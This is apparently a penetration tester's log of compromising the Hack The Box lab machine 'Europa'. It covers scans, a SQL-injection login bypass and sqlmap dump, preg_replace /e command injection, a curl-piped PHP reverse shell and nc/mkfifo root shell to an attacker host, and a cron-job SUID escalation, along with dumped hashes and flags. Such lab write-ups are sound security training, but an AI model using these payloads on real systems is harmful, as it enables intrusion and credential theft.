@@ -1,0 +1,585 @@
+Machine-Name  :  Europa
+IP-Address    :  10.129.116.116
+
+Command-Line: sudo nmap -A 10.129.116.116
+Result:
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-08 07:37 EST
+    Nmap scan report for 10.129.116.116
+    Host is up (0.052s latency).
+    Not shown: 997 filtered ports
+    PORT    STATE SERVICE  VERSION
+    22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
+    |   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
+    |_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
+    80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
+    |_http-server-header: Apache/2.4.18 (Ubuntu)
+    |_http-title: Apache2 Ubuntu Default Page: It works
+    443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
+    |_http-server-header: Apache/2.4.18 (Ubuntu)
+    |_http-title: Apache2 Ubuntu Default Page: It works
+    | ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
+    | Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
+    | Not valid before: 2017-04-19T09:06:22
+    |_Not valid after:  2027-04-17T09:06:22
+    |_ssl-date: TLS randomness does not represent time
+    | tls-alpn:
+    |_  http/1.1
+    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+    Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
+    No exact OS matches for host (test conditions non-ideal).
+    Network Distance: 2 hops
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 80/tcp)
+    HOP RTT      ADDRESS
+    1   52.89 ms 10.10.14.1
+    2   55.03 ms 10.129.116.116
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 27.26 seconds
+
+
+
+Command-Line: sslyze --regular 10.129.116.116
+Result:
+     CHECKING HOST(S) AVAILABILITY
+     -----------------------------
+
+       10.129.116.116:443                       => 10.129.116.116
+
+
+
+
+     SCAN RESULTS FOR 10.129.116.116:443 - 10.129.116.116
+     ----------------------------------------------------
+
+     * Elliptic Curve Key Exchange:
+           Supported curves:                  prime256v1, secp256k1, secp384r1, secp521r1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1
+           Rejected curves:                   X25519, X448, prime192v1, secp160k1, secp160r1, secp160r2, secp192k1, secp224k1, secp224r1, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1
+
+     * TLS 1.0 Cipher Suites:
+         Attempted to connect using 80 cipher suites.
+
+         The server accepted the following 2 cipher suites:
+            TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                256       ECDH: prime256v1 (256 bits)
+            TLS_DHE_RSA_WITH_AES_256_CBC_SHA                  256       DH (2048 bits)
+
+         The group of cipher suites supported by the server has the following properties:
+           Forward Secrecy                    OK - Supported
+           Legacy RC4 Algorithm               OK - Not Supported
+
+
+     * OpenSSL CCS Injection:
+                                              OK - Not vulnerable to OpenSSL CCS injection
+
+     * OpenSSL Heartbleed:
+                                              OK - Not vulnerable to Heartbleed
+
+     * Session Renegotiation:
+           Client Renegotiation DoS Attack:   OK - Not vulnerable
+           Secure Renegotiation:              OK - Supported
+
+     * Deflate Compression:
+                                              OK - Compression disabled
+
+     * SSL 2.0 Cipher Suites:
+         Attempted to connect using 7 cipher suites; the server rejected all cipher suites.
+
+     * TLS 1.2 Session Resumption Support:
+          With Session IDs: OK - Supported (5 successful resumptions out of 5 attempts).
+          With TLS Tickets: OK - Supported.
+
+     * Certificates Information:
+           Hostname sent for SNI:             10.129.116.116
+           Number of certificates detected:   1
+
+
+         Certificate #0 ( _RSAPublicKey )
+           SHA1 Fingerprint:                  ced98f011228e35d83d32634b4c1ed52b9173335
+           Common Name:                       europacorp.htb
+           Issuer:                            europacorp.htb
+           Serial Number:                     17411251501966697666
+           Not Before:                        2017-04-19
+           Not After:                         2027-04-17
+           Public Key Algorithm:              _RSAPublicKey
+           Signature Algorithm:               sha256
+           Key Size:                          3072
+           Exponent:                          65537
+           DNS Subject Alternative Names:     ['www.europacorp.htb', 'admin-portal.europacorp.htb']
+
+         Certificate #0 - Trust
+           Hostname Validation:               FAILED - Certificate does NOT match server hostname
+           Android CA Store (9.0.0_r9):       FAILED - Certificate is NOT Trusted: self signed certificate
+           Apple CA Store (iOS 14, iPadOS 14, macOS 11, watchOS 7, and tvOS 14):FAILED - Certificate is NOT Trusted: self signed certificate
+           Java CA Store (jdk-13.0.2):        FAILED - Certificate is NOT Trusted: self signed certificate
+           Mozilla CA Store (2021-01-24):     FAILED - Certificate is NOT Trusted: self signed certificate
+           Windows CA Store (2021-02-08):     FAILED - Certificate is NOT Trusted: self signed certificate
+           Symantec 2018 Deprecation:         ERROR - Could not build verified chain (certificate untrusted?)
+           Received Chain:                    europacorp.htb
+           Verified Chain:                    ERROR - Could not build verified chain (certificate untrusted?)
+           Received Chain Contains Anchor:    ERROR - Could not build verified chain (certificate untrusted?)
+           Received Chain Order:              OK - Order is valid
+           Verified Chain contains SHA1:      ERROR - Could not build verified chain (certificate untrusted?)
+
+         Certificate #0 - Extensions
+           OCSP Must-Staple:                  NOT SUPPORTED - Extension not found
+           Certificate Transparency:          NOT SUPPORTED - Extension not found
+
+         Certificate #0 - OCSP Stapling
+                                              NOT SUPPORTED - Server did not send back an OCSP response
+
+     * TLS 1.2 Cipher Suites:
+         Attempted to connect using 156 cipher suites.
+
+         The server accepted the following 8 cipher suites:
+            TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384             256       ECDH: prime256v1 (256 bits)
+            TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384             256       ECDH: prime256v1 (256 bits)
+            TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                256       ECDH: prime256v1 (256 bits)
+            TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256             128       ECDH: prime256v1 (256 bits)
+            TLS_DHE_RSA_WITH_AES_256_GCM_SHA384               256       DH (2048 bits)
+            TLS_DHE_RSA_WITH_AES_256_CBC_SHA256               256       DH (2048 bits)
+            TLS_DHE_RSA_WITH_AES_256_CBC_SHA                  256       DH (2048 bits)
+            TLS_DHE_RSA_WITH_AES_128_GCM_SHA256               128       DH (2048 bits)
+
+         The group of cipher suites supported by the server has the following properties:
+           Forward Secrecy                    OK - Supported
+           Legacy RC4 Algorithm               OK - Not Supported
+
+
+     * SSL 3.0 Cipher Suites:
+         Attempted to connect using 80 cipher suites; the server rejected all cipher suites.
+
+     * TLS 1.3 Cipher Suites:
+         Attempted to connect using 5 cipher suites; the server rejected all cipher suites.
+
+     * ROBOT Attack:
+                                              OK - Not vulnerable, RSA cipher suites not supported.
+
+     * TLS 1.1 Cipher Suites:
+         Attempted to connect using 80 cipher suites.
+
+         The server accepted the following 2 cipher suites:
+            TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                256       ECDH: prime256v1 (256 bits)
+            TLS_DHE_RSA_WITH_AES_256_CBC_SHA                  256       DH (2048 bits)
+
+         The group of cipher suites supported by the server has the following properties:
+           Forward Secrecy                    OK - Supported
+           Legacy RC4 Algorithm               OK - Not Supported
+
+
+     * Downgrade Attacks:
+           TLS_FALLBACK_SCSV:                 OK - Supported
+
+
+     SCAN COMPLETED IN 12.89 S
+
+
+Notes: Found "DNS Subject Alternative Names:     ['www.europacorp.htb', 'admin-portal.europacorp.htb']"
+Browser: https://admin-portal.europacorp.htb
+Notes: Found login page. Username is checking for "email syntax ex: admin@europacorp.htb". Trying SQL injection.
+Notes: Set FireFox proxy to "no proxy". Viewed Certificate information. Found email address: "admin@europacorp.htb"
+
+BurpSuite: Turned 'intercept' ON.
+Browser: Logging in with username 'admin@europacorp.htb', password 'admin'.
+BurpSuite: Sent to 'repeater'.
+Notes: Added SQL injection.
+SQL-Injection: email=admin%40europacorp.htb'--+OR+"1"+%3d+"1"&password=admin
+Notes: Followed redirect. Turned 'intercept' OFF.
+Result:
+    *** LOGGED INTO SYSTEM ***
+
+Exploit: (PHP) preg_replace()
+Browser: php regex danger
+URL: https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace
+
+Notes: Clicked on "Tools". Sent the generated code to BurpSuite.
+BurpSuite:
+    Repeater-Request:
+        POST /tools.php HTTP/1.1
+        Host: admin-portal.europacorp.htb
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 1326
+        Origin: https://admin-portal.europacorp.htb
+        Connection: close
+        Referer: https://admin-portal.europacorp.htb/tools.php
+        Cookie: PHPSESSID=f189tqh4m02jbrrfhu4d2otlv2
+        Upgrade-Insecure-Requests: 1
+        *** CHANGED "/ip-address/i" to "/vtun0/e". "/e" for regular-expression. Performing php system method. ***
+        pattern=/vtun0/e&ipaddress=system("cat /home/john/user.txt;")&text="openvpn": {
+                "vtun0": {
+                        "local-address": {
+                                "10.10.10.1": "''"
+                        },
+                        "local-port": "1337",
+                        "mode": "site-to-site",
+                        "openvpn-option": [
+                                "--comp-lzo",
+                                "--float",
+                                "--ping 10",
+                                "--ping-restart 20",
+                                "--ping-timer-rem",
+                                "--persist-tun",
+                                "--persist-key",
+                                "--user nobody",
+                                "--group nogroup"
+                        ],
+                        "remote-address": "ip_address",
+                        "remote-port": "1337",
+                        "shared-secret-key-file": "/config/auth/secret"
+                },
+                "protocols": {
+                        "static": {
+                                "interface-route": {
+                                        "ip_address/24": {
+                                                "next-hop-interface": {
+                                                        "vtun0": "''"
+                                                }
+                                        }
+                                }
+                        }
+                }
+        }
+
+********************************************************************************
+    Repeater-Response:
+        <div class="panel-body">
+            <p>"openvpn":
+              {<br /> "2f8d40cc05295154a9c3452c19ddc221":
+                {<br />"local-address":
+                  {<br />"10.10.10.1": "''"<br />
+              },<br />
+                 "local-port": "1337",<br />
+                 "mode": "site-to-site",<br />
+                 "openvpn-option": [<br />
+                         "--comp-lzo",<br />
+                         "--float",<br />
+                         "--ping 10",<br />
+                         "--ping-restart 20",<br />
+                         "--ping-timer-rem",<br />
+                         "--persist-tun",<br />
+                         "--persist-key",<br />
+                         "--user nobody",<br />
+                         "--group nogroup"<br />
+                 ],<br />
+                 "remote-address": "ip_address",<br />
+                 "remote-port": "1337",<br />
+                 "shared-secret-key-file": "/config/auth/secret"<br />
+            },<br />
+            "protocols": {<br />
+                 "static": {<br />
+                         "interface-route": {<br />
+                                 "ip_address/24": {<br />
+                                         "next-hop-interface": {<br />
+                                                 "2f8d40cc05295154a9c3452c19ddc221": "''"<br />
+                                         }<br />
+                                 }<br />
+                         }<br />
+                 }<br />
+            }<br />
+            }<br />
+                                 </p>
+                         <a href="tools.php" class="btn btn-lg btn-success btn-block">New Configuration</a>
+        </div>
+
+
+Result: 2f8d40cc05295154a9c3452c19ddc221
+    Found user "john"
+    *** USER OWNED ***
+
+
+
+Attempting reverse-shell...
+
+
+Notes: Because we know this page is vulnerable to sql-injection, we will try the following code provided by IppSec.
+sqlmap: sqlmap -r login.req --dbms mysql -p email --force-ssl
+Result:
+    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+    [*] starting @ 06:13:57 /2021-03-10/
+
+    [06:13:57] [INFO] parsing HTTP request from 'login.req'
+    [06:13:57] [INFO] testing connection to the target URL
+    [06:13:57] [INFO] testing if the target URL content is stable
+    [06:13:58] [INFO] target URL content is stable
+    [06:13:58] [INFO] heuristic (basic) test shows that POST parameter 'email' might be injectable (possible DBMS: 'MySQL')
+    [06:13:58] [INFO] heuristic (XSS) test shows that POST parameter 'email' might be vulnerable to cross-site scripting (XSS) attacks
+    [06:13:58] [INFO] testing for SQL injection on POST parameter 'email'
+    for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]
+    [06:14:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+    [06:14:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+    [06:14:10] [INFO] testing 'Generic inline queries'
+    [06:14:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+    got a 302 redirect to 'https://admin-portal.europacorp.htb/dashboard.php'. Do you want to follow? [Y/n]
+    redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N]
+    [06:14:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+    [06:14:34] [WARNING] reflective value(s) found and filtering out
+    [06:14:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+    [06:15:08] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+    [06:15:11] [INFO] POST parameter 'email' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --code=302)
+    [06:15:11] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+    [06:15:11] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+    [06:15:11] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+    [06:15:11] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+    [06:15:12] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+    [06:15:12] [INFO] POST parameter 'email' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
+    [06:15:12] [INFO] testing 'MySQL inline queries'
+    [06:15:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+    [06:15:13] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+    [06:15:13] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+    [06:15:13] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+    [06:15:13] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+    [06:15:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+    [06:15:14] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+    [06:15:25] [INFO] POST parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+    [06:15:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+    [06:15:25] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+    [06:15:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+    [06:15:26] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+    [06:15:27] [INFO] target URL appears to have 5 columns in query
+    do you want to (re)try to find proper UNION column types with fuzzy test? [y/N]
+    injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]
+    [06:16:04] [INFO] target URL appears to be UNION injectable with 5 columns
+    injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]
+    [06:16:29] [INFO] testing 'MySQL UNION query (88) - 21 to 40 columns'
+    [06:16:34] [INFO] testing 'MySQL UNION query (88) - 41 to 60 columns'
+    [06:16:40] [INFO] testing 'MySQL UNION query (88) - 61 to 80 columns'
+    [06:16:45] [INFO] testing 'MySQL UNION query (88) - 81 to 100 columns'
+    POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+    sqlmap identified the following injection point(s) with a total of 348 HTTP(s) requests:
+    ---
+    Parameter: email (POST)
+        Type: boolean-based blind
+        Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+        Payload: email=admin@europacorp.htb' RLIKE (SELECT (CASE WHEN (6341=6341) THEN 0x61646d696e406575726f7061636f72702e687462 ELSE 0x28 END))-- WnGT&password=admin
+
+        Type: error-based
+        Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+        Payload: email=admin@europacorp.htb' AND GTID_SUBSET(CONCAT(0x716b786271,(SELECT (ELT(6339=6339,1))),0x716a706b71),6339)-- ItcX&password=admin
+
+        Type: time-based blind
+        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+        Payload: email=admin@europacorp.htb' AND (SELECT 5217 FROM (SELECT(SLEEP(5)))tQEh)-- iVIv&password=admin
+    ---
+    [06:16:56] [INFO] the back-end DBMS is MySQL
+    web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
+    web application technology: Apache 2.4.18
+    back-end DBMS: MySQL >= 5.6
+    [06:16:58] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/admin-portal.europacorp.htb'
+
+    [*] ending @ 06:16:58 /2021-03-10/
+
+
+********************************************************************************
+
+
+sqlmap: sqlmap -r login.req --dbms mysql --force-ssl --dump
+Result:
+    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+    [*] starting @ 06:32:16 /2021-03-10/
+
+    [06:32:16] [INFO] parsing HTTP request from 'login.req'
+    [06:32:16] [INFO] testing connection to the target URL
+    got a 302 redirect to 'https://admin-portal.europacorp.htb/dashboard.php'. Do you want to follow? [Y/n]
+    redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n]
+    sqlmap resumed the following injection point(s) from stored session:
+    ---
+    Parameter: email (POST)
+        Type: boolean-based blind
+        Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+        Payload: email=admin@europacorp.htb' RLIKE (SELECT (CASE WHEN (6341=6341) THEN 0x61646d696e406575726f7061636f72702e687462 ELSE 0x28 END))-- WnGT&password=admin
+
+        Type: error-based
+        Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+        Payload: email=admin@europacorp.htb' AND GTID_SUBSET(CONCAT(0x716b786271,(SELECT (ELT(6339=6339,1))),0x716a706b71),6339)-- ItcX&password=admin
+
+        Type: time-based blind
+        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+        Payload: email=admin@europacorp.htb' AND (SELECT 5217 FROM (SELECT(SLEEP(5)))tQEh)-- iVIv&password=admin
+    ---
+    [06:32:19] [INFO] testing MySQL
+    [06:32:19] [INFO] confirming MySQL
+    [06:32:20] [INFO] the back-end DBMS is MySQL
+    web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
+    web application technology: Apache 2.4.18
+    back-end DBMS: MySQL >= 5.0.0
+    [06:32:20] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+    [06:32:20] [INFO] fetching current database
+    [06:32:20] [INFO] retrieved: 'admin'
+    [06:32:20] [INFO] fetching tables for database: 'admin'
+    [06:32:20] [INFO] retrieved: 'users'
+    [06:32:21] [INFO] fetching columns for table 'users' in database 'admin'
+    [06:32:21] [INFO] retrieved: 'id'
+    [06:32:21] [INFO] retrieved: 'int(11)'
+    [06:32:22] [INFO] retrieved: 'username'
+    [06:32:22] [INFO] retrieved: 'varchar(255)'
+    [06:32:22] [INFO] retrieved: 'email'
+    [06:32:22] [INFO] retrieved: 'varchar(255)'
+    [06:32:23] [INFO] retrieved: 'password'
+    [06:32:23] [INFO] retrieved: 'varchar(255)'
+    [06:32:23] [INFO] retrieved: 'active'
+    [06:32:23] [INFO] retrieved: 'tinyint(1)'
+    [06:32:23] [INFO] fetching entries for table 'users' in database 'admin'
+    [06:32:24] [INFO] retrieved: '1'
+    [06:32:24] [INFO] retrieved: 'admin@europacorp.htb'
+    [06:32:24] [INFO] retrieved: '1'
+    [06:32:25] [INFO] retrieved: '2b6d315337f18617ba18922c0b9597ff'
+    [06:32:25] [INFO] retrieved: 'administrator'
+    [06:32:25] [INFO] retrieved: '1'
+    [06:32:25] [INFO] retrieved: 'john@europacorp.htb'
+    [06:32:26] [INFO] retrieved: '2'
+    [06:32:26] [INFO] retrieved: '2b6d315337f18617ba18922c0b9597ff'
+    [06:32:26] [INFO] retrieved: 'john'
+    [06:32:26] [INFO] recognized possible password hashes in column 'password'
+    do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]
+    do you want to crack them via a dictionary-based attack? [Y/n/q]
+    [06:33:22] [INFO] using hash method 'md5_generic_passwd'
+    what dictionary do you want to use?
+    [1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+    [2] custom dictionary file
+    [3] file with list of dictionary files
+    >
+    [06:33:26] [INFO] using default dictionary
+    do you want to use common password suffixes? (slow!) [y/N]
+    [06:33:28] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+    [06:33:28] [INFO] starting 12 processes
+    [06:33:32] [WARNING] no clear password(s) found
+    Database: admin
+    Table: users
+    [2 entries]
+    +----+----------------------+--------+----------------------------------+---------------+
+    | id | email                | active | password                         | username      |
+    +----+----------------------+--------+----------------------------------+---------------+
+    | 1  | admin@europacorp.htb | 1      | 2b6d315337f18617ba18922c0b9597ff | administrator |
+    | 2  | john@europacorp.htb  | 1      | 2b6d315337f18617ba18922c0b9597ff | john          |
+    +----+----------------------+--------+----------------------------------+---------------+
+
+    [06:33:32] [INFO] table 'admin.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/admin-portal.europacorp.htb/dump/admin/users.csv'
+    [06:33:32] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/admin-portal.europacorp.htb'
+
+    [*] ending @ 06:33:32 /2021-03-10/
+
+
+Browser: https://hashes.com
+Notes: 2b6d315337f18617ba18922c0b9597ff:SuperSecretPassword!
+Password-Found: SuperSecretPassword!
+
+
+Command-Line: cp /usr/share/laudanum/php/php-reverse-shell.php reverse-shell.php
+Command-Line: sudo python3 -m http.server --bind 10.10.14.32 80
+Command-Line: nc -lvnp 9001
+
+BurpSuite:
+    POST /tools.php HTTP/1.1
+    Host: admin-portal.europacorp.htb
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 1343
+    Origin: https://admin-portal.europacorp.htb
+    Connection: close
+    Referer: https://admin-portal.europacorp.htb/tools.php
+    Cookie: PHPSESSID=f189tqh4m02jbrrfhu4d2otlv2
+    Upgrade-Insecure-Requests: 1
+
+    pattern=/vtun0/e&ipaddress=system('curl 10.10.14.32/reverse-shell.php | php;')&text="openvpn": {
+            "vtun0": {
+                    "local-address": {
+                            "10.10.10.1": "''"
+                    },
+                    "local-port": "1337",
+                    "mode": "site-to-site",
+                    "openvpn-option": [
+                            "--comp-lzo",
+                            "--float",
+                            "--ping 10",
+                            "--ping-restart 20",
+                            "--ping-timer-rem",
+                            "--persist-tun",
+                            "--persist-key",
+                            "--user nobody",
+                            "--group nogroup"
+                    ],
+                    "remote-address": "ip_address",
+                    "remote-port": "1337",
+                    "shared-secret-key-file": "/config/auth/secret"
+            },
+            "protocols": {
+                    "static": {
+                            "interface-route": {
+                                    "ip_address/24": {
+                                            "next-hop-interface": {
+                                                    "vtun0": "''"
+                                            }
+                                    }
+                            }
+                    }
+            }
+    }
+
+Notes: Uploaded reverse-shell.php with "curl" and executed the file by piping it into "php".
+Result:
+    *** Reverse-Shell ***
+    $
+
+$ export TERM=linux
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+ctrl + Z ... stty raw -echo ... fg ... enter ... enter
+Result:
+    www-data@europa:/$
+
+
+www-data@europa:/$ cd /dev/shm
+
+www-data@europa:/dev/shm$ ./linpeas.sh
+Result:
+    OS: Linux version 4.4.0-81-generic (buildd@lgw01-02) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #104-Ubuntu SMP Wed Jun 14 08:17:06 UTC 2017
+
+    * * * * *       root    /var/www/cronjobs/clearlogs
+
+
+www-data@europa:/dev/shm$ cat /var/www/cronjobs/clearlogs
+Result:
+    #!/usr/bin/php
+    <?php
+      $file = '/var/www/admin/logs/access.log';
+      file_put_contents($file, '');
+      exec('/var/www/cmd/logcleared.sh');
+    ?>
+
+Notes: Cronjob is executing "/var/www/cmd/logcleared.sh".
+Notes: No file found. Creating one with "nano".
+www-data@europa:/dev/shm$ cd /var/www/cmd/
+www-data@europa:/var/www/cmd/$ nano logcleared.sh
+File-Contents:
+    chmod 4755 /bin/less
+www-data@europa:/var/www/cmd/$ chmod +x logcleared.sh
+www-data@europa:/var/www/cmd/$ less /root/root.txt
+Result: 7f19438b27578e4fcc8bef3a029af5a5
+    *** ROOT OWNED ***
+
+
+Attempting root access...
+
+
+
+www-data@europa:/var/www/cmd/$ rm -rf logcleared.sh
+Command-Line: nc -lvnp 9002
+www-data@europa:/var/www/cmd/$ nano logcleared.sh
+File-Contents:
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.32 9002 >/tmp/f
+Result:
+    *** ROOT ACCESS***
+    #
+
+
+      *** FINISHED ***
